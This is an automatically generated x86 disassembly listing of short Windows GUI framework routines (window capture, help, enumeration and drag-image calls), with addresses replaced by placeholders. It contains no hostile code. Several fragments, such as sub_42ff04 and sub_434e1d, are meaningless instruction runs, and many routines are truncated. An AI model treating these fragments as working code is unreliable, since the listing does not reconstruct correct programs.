push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_42d3c4
retn
sub_42d590
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_42d3c4
retn
sub_42d5a4
push ebx
mov ebx eax
mov eax ebx
call sub_43357c
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_42d5c8
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_42d700
call sub_42d5e8
retn
sub_42d708
call sub_42d5e8
retn
sub_42d738
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42d765
jmp sub_40382c
sub_42d76c
pop ebp
retn
sub_42d770
sub [ rw-data ] 0x1
retn
sub_42d8cd
jmp sub_40382c
sub_42d8d4
pop ebp
retn
sub_42d8d8
sub [ rw-data ] 0x1
retn
sub_42d8e0
xchg [ fs : esi ] al
or edi edi
add [ eax ] al
int3
sub_42db41
jmp sub_40382c
sub_42db48
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42db84
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f00
pop ebx
retn
sub_42dbff
jmp sub_40382c
sub_42dc06
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42dc98
jmp sub_40382c
sub_42dc9f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42dd33
jmp sub_40382c
sub_42dd3a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42de38
jmp sub_40382c
sub_42de3f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42de8c
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_42deb1
inc [ ebx + 0x74001c7b ]
or [ ebp + 0x28e81c43 ] cl
jbe r-xdata
sub [ esi - 0x3 ] dh
inc [ ebx + 0x468b003d ]
add [ eax ] al
je r-xdata
pop ebx
retn
mov eax rw-data
call sub_4054e8
sub_42df30
jmp sub_40382c
sub_42df37
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e036
jmp sub_40382c
sub_42e03d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e0b6
jmp sub_40382c
sub_42e0bd
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42e148
jmp sub_40382c
sub_42e14f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e243
jmp sub_40382c
sub_42e24a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42e30c
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_42e258
call EnumWindows
retn
sub_42e39e
jmp sub_40382c
sub_42e3a5
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42e3b0
xor eax eax
retn
sub_42e4a9
jmp sub_40382c
sub_42e4b0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e59a
jmp sub_40382c
sub_42e5a1
pop ebp
retn
sub_42e5f6
jmp sub_40382c
sub_42e5fd
pop ebp
retn
sub_42ff04
mov eax 0xb6ffb7ff
push [ ebp + 0xffb4ff ]
add [ ebx ] 0x60
test [ ebx ] al
add [ ebx + eax * 2 + 0x4384a400 ] 0x0
hlt
sub_430a63
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_413310
retn
sub_430a80
push 0x15
mov ecx rw-data
call sub_4132d0
retn
sub_430b18
call GetCapture
call sub_430850
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_430d7c
push ebx
push eax
push sub_430f00
call sub_41ac58
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_430d94
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_430dc4
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41ad0c
pop ebx
retn
sub_430ea2
jmp sub_403578
sub_430ed4
xor eax eax
retn
sub_430ed8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_430ef0
retn
sub_430ef4
mov eax [ rw-data ]
retn
sub_430efc
retn
sub_430f2a
jmp sub_403578
sub_430f2f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430f4c
call sub_403330
xor eax eax
mov [ rw-data ] eax
retn
sub_430f5c
call sub_40332c
xor eax eax
mov [ rw-data ] eax
retn
sub_430f6c
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_43101c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_431034
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_431080
retn
sub_431238
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_4032ec
pop esi
retn
sub_43124c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_4032ec
pop esi
retn
sub_431260
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43126c
mov eax 0x4
retn
sub_431274
retn
sub_431e65
jmp sub_403578
sub_432152
jmp sub_40382c
sub_4321c4
jmp sub_40382c
sub_4321d0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_431ef8
sub_43234f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d9d4
retn
sub_432365
jmp sub_40382c
sub_43238c
jmp sub_40382c
sub_43240e
jmp sub_40382c
sub_432436
jmp sub_40382c
sub_43243d
mov esp ebp
pop ebp
retn
sub_4324f5
jmp sub_40382c
sub_43254c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_432518
mov [ ebx + 0x58 ] esi
sub_4326a0
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4326b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43279d
jmp sub_40382c
sub_4327a4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432827
jmp sub_40382c
sub_43282e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_432bfc
xor eax eax
retn
sub_432c00
mov al [ eax + 0x58 ]
retn
sub_432c04
xor eax eax
retn
sub_432c08
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_432c10
mov eax [ eax + 0x30 ]
retn
sub_432cb4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_432d60
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_432d78
mov [ eax + 0x5d ] dl
retn
sub_432d7c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_436974
sub_432d8c
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43326f
jmp sub_40382c
sub_433276
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4332d8
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43335c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_433479
jmp sub_40382c
sub_433480
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43357c
push eax
xor ecx ecx
mov edx 0xb037
call sub_434b3c
retn
sub_43373d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4032ec
sub_4337ee
jmp sub_40382c
sub_4337f5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4338cc
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_434b3c
sub_4338e4
push 0x0
xor ecx ecx
mov edx 0xe
call sub_434b3c
retn
sub_4338f4
push edx
mov edx 0xd
call sub_434b3c
retn
sub_433900
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_433914
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_4339f5
jmp sub_40382c
sub_4339fc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433a04
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_434b3c
sub_433a74
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_433a88
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_433a94
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_433a9c
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_434b3c
sub_433ac0
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_434b3c
sub_433ae4
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_434b3c
sub_433b2c
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_433b34
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_434b3c
sub_433b58
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_434b3c
sub_433b7c
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_434b3c
sub_433b98
push ebx
mov ebx eax
call sub_430b18
cmp ebx eax
sete al
pop ebx
retn
sub_433bd0
push esi
mov dl 0x1
mov si 0xffce
call sub_4032ec
pop esi
retn
sub_433d1a
jmp sub_40382c
sub_433d21
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433e44
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_433db8
retn
sub_433e98
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_433eac
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_433f91
jmp sub_40382c
sub_433fb0
xor eax eax
retn
sub_433fb4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_433fcc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_433fe4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_433ffc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_434018
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_434030
retn
sub_4340f4
retn
sub_4340f8
cmp eax [ rw-data ]
sete al
retn
sub_43416c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_434288
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_4032ec
pop esi
pop ebp
retn 0x4
sub_4342c8
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43455f
jmp sub_40382c
sub_434566
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434570
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_4032ec
pop esi
retn
sub_434584
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_4032ec
pop esi
retn
sub_434853
jmp sub_40382c
sub_4348fc
push esi
mov si 0xffee
call sub_4032ec
pop esi
retn
sub_434908
mov al 0x1
retn
sub_434be0
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_432fc4
retn
sub_434c04
retn
sub_434e1d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416f20
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_434e38
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419258
retn
sub_434f30
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_435548
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_435550
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_435558
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_435610
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_435630
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_433ac0
mov [ ebx + 0x9a ] 0x1
sub_435688
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_433a64
mov [ ebx + 0x56 ] 0x1
sub_4356ac
mov [ edx + 0xc ] 0x1
retn
sub_4356b4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_434b3c
sub_4356cc
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_434b3c
sub_4356e4
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_43594a
jmp sub_40382c
sub_435951
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43597c
mov eax [ r-xdata ]
retn
sub_435b18
jmp sub_40382c
sub_435b1f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435c40
mov eax [ eax + 0xb8 ]
retn
sub_435ca8
push ebx
mov ebx eax
mov eax ebx
call sub_433fcc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_435cc4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_435e5c
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_435e8c
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_435e94
call sub_432a30
retn
sub_435f94
jmp sub_40382c
sub_436154
jmp sub_40382c
sub_4361a4
jmp sub_40382c
sub_4361dc
retn
sub_436465
jmp sub_40382c
sub_4365ed
jmp sub_40382c
sub_43694f
jmp sub_40382c
sub_4369fb
jmp sub_40382c
sub_436a08
inc [ eax + 0x160 ]
retn
sub_436a10
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_436a30
sub_436a30
xor edx edx
call sub_436974
retn
sub_436afd
jmp sub_40382c
sub_436b04
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_436bf3
jmp sub_40382c
sub_43711a
jmp sub_40382c
sub_437121
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4372e9
jmp sub_40382c
sub_4372f0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4373c4
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4375b1
jmp sub_40382c
sub_4375b8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4376a8
xor eax eax
retn
sub_437710
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_434b3c
sub_43783e
jmp sub_403578
sub_437973
jmp sub_40382c
sub_43797a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437984
jmp sub_403578
sub_437989
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_437f44
jmp sub_40382c
sub_437f4b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437f54
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_438452
jmp sub_40382c
sub_4384a4
push ebx
mov ebx eax
call sub_41c1ac
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_434b3c
pop ebx
retn
sub_4384c0
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_434b3c
retn
sub_4384d4
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_434b3c
retn
sub_4384e4
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_434b3c
retn
sub_438790
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43a480
pop esi
retn
sub_4388a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4388f4
pop esi
retn
sub_4388b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4389e0
pop esi
retn
sub_4388cc
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4388e0
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4389d3
jmp sub_40382c
sub_4389da
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438a6a
jmp sub_40382c
sub_438a71
pop ebx
pop ecx
pop ebp
retn
sub_438a78
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_438a88
retn
sub_438a8c
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_438aac
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_438c0c
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_438cdc
retn
sub_438df4
jmp sub_40382c
sub_438dfb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438ec6
jmp sub_40382c
sub_438ef0
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_438f82
jmp sub_40382c
sub_439154
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_4393f8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_4394d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_436f00
pop esi
retn
sub_439598
push esi
mov si 0xffc1
call sub_4032ec
pop esi
retn
sub_4395c4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4395d8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4395ec
call sub_436ec0
retn
sub_4395f4
call sub_436ec0
retn
sub_4395fc
call sub_436ec0
retn
sub_4396a4
push ebx
mov ebx eax
mov eax ebx
call sub_435558
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41d324
mov dx 0xb009
mov eax ebx
call sub_436f00
pop ebx
retn
sub_439808
call sub_436ec0
retn
sub_439810
call sub_436ec0
retn
sub_439818
call sub_436ec0
retn
sub_439820
call sub_436ec0
retn
sub_439884
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_439d1a
jmp sub_40382c
sub_439d21
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439e00
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_439fa4
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_434b3c
retn
sub_43a044
push ebx
mov ebx eax
mov eax ebx
call sub_43a474
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_43a060
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_43a238
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_43a170
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_43a290
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_434b3c
sub_43a2b0
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_434b3c
sub_43a2d4
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_43a2e0
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_434b3c
sub_43a38c
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_43a330
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_43a468
jmp sub_40382c
sub_43a46f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a68e
jmp sub_40382c
sub_43a695
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43a79c
call sub_43490c
retn
sub_43abea
jmp sub_40382c
sub_43ac80
mov eax [ r-xdata ]
retn
sub_43ade7
jmp sub_40382c
sub_43aef8
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_434b3c
sub_43b20e
jmp sub_40382c
sub_43b350
test [ eax + 0x52 ] 0x4
setne al
retn
sub_43b468
mov [ edx + 0xc ] 0xffffffff
retn
sub_43b4c6
jmp sub_40382c
sub_43b4cd
pop ecx
pop ecx
pop ebp
retn
sub_43b56d
jmp sub_40382c
sub_43b574
pop ebx
mov esp ebp
pop ebp
retn
sub_43b5e0
call sub_4376c8
retn
sub_43b673
jmp sub_40382c
sub_43b67a
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_43b859
jmp sub_40382c
sub_43b860
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ba7c
jmp sub_40382c
sub_43bad0
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_43b9bc
sub_43bc14
push ebx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_43bc2c
push ebx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_43bd18
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_438300
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_43bdb3
jmp sub_40382c
sub_43bdba
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bddd
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d9d4
retn
sub_43bdd6
jmp sub_40382c
sub_43bddd
pop ebx
pop ecx
pop ebp
retn
sub_43bde4
retn
sub_43be4c
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_43c1b9
jmp sub_40382c
sub_43c3a0
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_43c58c
jmp sub_40382c
sub_43c63c
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_43c650
inc [ eax + 0x6c ]
retn
sub_43c654
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
